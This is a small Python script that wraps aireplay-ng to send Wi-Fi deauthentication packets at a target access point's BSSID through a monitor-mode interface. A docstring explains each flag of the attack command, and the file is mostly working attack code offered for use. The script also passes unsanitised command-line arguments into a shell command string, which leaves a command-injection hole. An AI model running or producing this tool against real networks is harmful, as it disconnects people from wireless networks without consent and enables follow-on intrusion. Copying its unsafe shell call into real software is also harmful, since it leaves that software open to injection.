import argparse

#import run command function
from RunCommand import run_command


""" 
define de-auth command function

def deauth_command():
        run_command(f"aireplay-ng -0 10 -a XX:XX:XX:XX:XX:XX wlan0mon")


aireplay-ng: The primary packet injection tool being executed.

-0: Specifies the attack mode. The "0" represents a deauthentication attack.

10: The number of deauthentication packets to send. - ARGUMENT NEEDED

-a: The flag indicating the target Access Point's MAC address.

XX:XX:XX:XX:XX:XX: The placeholder for the target Access Point's MAC address (BSSID). - ARGUMENT NEEDED

wlan0mon: The wireless network interface, operating in monitor mode, used to send the packets. - ARGUMENT NEEDED
"""



def main():
    # Make argument parser with description
    parser = argparse.ArgumentParser(description="Taking in required information to run a De-Auth command")

    # Add a positional argument for the networks BSSID
    parser.add_argument("BSSID", help="The target networks BSSID/MAC address. Ex- XX:XX:XX:XX:XX:XX")

    # Add a positional argument for number of de-auth packets
    parser.add_argument("payload", help="The number of deauth packets to send. Ex- 10")

    # Add a positional argument (for MM network being used)
    parser.add_argument("network", help="The Network currently running monitor mode. Ex-wlan0mon")


    # Parse the arguments
    args = parser.parse_args()

    print(f"BSSID: {args.BSSID}")
    print(f"Payload: {args.payload}")
    print(f"Network: {args.network}")

    run_command(f"aireplay-ng -0 {args.payload} -a {args.BSSID} {args.network}")


if __name__ == "__main__":
    main()

""" 
Example command: 
python DeauthCommand.py TEST-BSSID 10 TEST-INTERFACE
    or
python DeauthCommand.py 12:te:08:12:08:12 10 wlan1
"""